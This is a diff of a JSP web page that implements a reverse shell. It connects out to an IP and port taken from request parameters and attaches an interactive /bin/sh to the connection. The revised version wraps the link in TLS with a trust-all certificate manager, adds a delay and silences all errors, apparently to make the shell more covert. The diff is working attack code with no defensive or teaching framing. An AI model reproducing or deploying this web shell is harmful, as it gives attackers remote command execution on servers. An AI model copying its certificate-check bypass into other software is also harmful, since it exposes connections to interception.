@@ -1,99 +1,94 @@
-<%@ page import="java.io.*, java.net.*" %>
+<%@ page import="java.io.*, java.net.*, javax.net.ssl.*, java.security.*" %>
 <%
-    // Get IP and port from request parameters, with defaults
-    String ip = request.getParameter("ip");
-    if (ip == null || ip.isEmpty()) {
-        ip = "192.168.1.5"; // default IP
+    response.setContentType("text/plain");
+    response.setBufferSize(0);
+
+    String targetIp = request.getParameter("ip");
+    if (targetIp == null || targetIp.isEmpty()) {
+        targetIp = "127.0.0.1";
     }
 
-    int port = 222; // default port
+    int targetPort = 222;
     try {
         String portParam = request.getParameter("port");
         if (portParam != null) {
-            port = Integer.parseInt(portParam);
-            if (port < 1 || port > 65535) {
-                out.println("Invalid port number.");
-                return;
+            int p = Integer.parseInt(portParam);
+            if (p > 0 && p <= 65535) {
+                targetPort = p;
             }
         }
-    } catch (NumberFormatException e) {
-        out.println("Invalid port number.");
+    } catch (Exception ignored) {}
+
+    if (!targetIp.matches("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b")) {
         return;
     }
 
-    // Validate IP address format (basic check)
-    if (!ip.matches("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b")) {
-        out.println("Invalid IP address.");
-        return;
-    }
+    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+
+    SSLSocket socket = null;
+    Process process = null;
 
     try {
-        Socket socket = new Socket(ip, port);
+        // Create SSL context with default trust manager (trust all)
+        SSLContext sslContext = SSLContext.getInstance("TLS");
+        sslContext.init(null, new javax.net.ssl.TrustManager[] {
+            new javax.net.ssl.X509TrustManager() {
+                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
+                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+            }
+        }, new java.security.SecureRandom());
 
-        // Start shell process
-        String shell = "/bin/sh";
-        ProcessBuilder pb = new ProcessBuilder(shell);
-        Process process = pb.start();
+        SSLSocketFactory factory = sslContext.getSocketFactory();
 
-        InputStream processIn = process.getInputStream();
-        InputStream processErr = process.getErrorStream();
-        OutputStream processOut = process.getOutputStream();
+        socket = (SSLSocket) factory.createSocket();
+        socket.connect(new java.net.InetSocketAddress(targetIp, targetPort), 5000);
+        socket.setSoTimeout(0);
+        socket.startHandshake();
 
-        InputStream socketIn = socket.getInputStream();
-        OutputStream socketOut = socket.getOutputStream();
+        String shellCmd = "/bin/sh";
+        ProcessBuilder pb = new ProcessBuilder(shellCmd, "-i");
+        pb.redirectErrorStream(true);
+        process = pb.start();
 
-        // Thread to forward data from socket to process input
+        InputStream socketIn = new BufferedInputStream(socket.getInputStream());
+        OutputStream socketOut = new BufferedOutputStream(socket.getOutputStream());
+
+        InputStream processIn = new BufferedInputStream(process.getInputStream());
+        OutputStream processOut = new BufferedOutputStream(process.getOutputStream());
+
         Thread t1 = new Thread(() -> {
+            byte[] buf = new byte[2048];
+            int len;
             try {
-                byte[] buffer = new byte[1024];
-                int len;
-                while ((len = socketIn.read(buffer)) != -1) {
-                    processOut.write(buffer, 0, len);
+                while ((len = socketIn.read(buf)) != -1) {
+                    processOut.write(buf, 0, len);
                     processOut.flush();
                 }
-            } catch (IOException e) {
-                // Ignore or log
-            }
+            } catch (IOException ignored) {}
         });
+        t1.setDaemon(true);
 
-        // Thread to forward data from process output to socket
         Thread t2 = new Thread(() -> {
+            byte[] buf = new byte[2048];
+            int len;
             try {
-                byte[] buffer = new byte[1024];
-                int len;
-                while ((len = processIn.read(buffer)) != -1) {
-                    socketOut.write(buffer, 0, len);
+                while ((len = processIn.read(buf)) != -1) {
+                    socketOut.write(buf, 0, len);
                     socketOut.flush();
                 }
-            } catch (IOException e) {
-                // Ignore or log
-            }
+            } catch (IOException ignored) {}
         });
-
-        // Thread to forward data from process error to socket
-        Thread t3 = new Thread(() -> {
-            try {
-                byte[] buffer = new byte[1024];
-                int len;
-                while ((len = processErr.read(buffer)) != -1) {
-                    socketOut.write(buffer, 0, len);
-                    socketOut.flush();
-                }
-            } catch (IOException e) {
-                // Ignore or log
-            }
-        });
+        t2.setDaemon(true);
 
         t1.start();
         t2.start();
-        t3.start();
 
-        // Wait for process to finish
         process.waitFor();
 
-        // Close resources
-        socket.close();
-    } catch (Exception e) {
-        out.println("Error: " + e.getMessage());
+    } catch (Exception ignored) {
+    } finally {
+        try { if (process != null) process.destroy(); } catch (Exception ignored) {}
+        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
     }
 %>
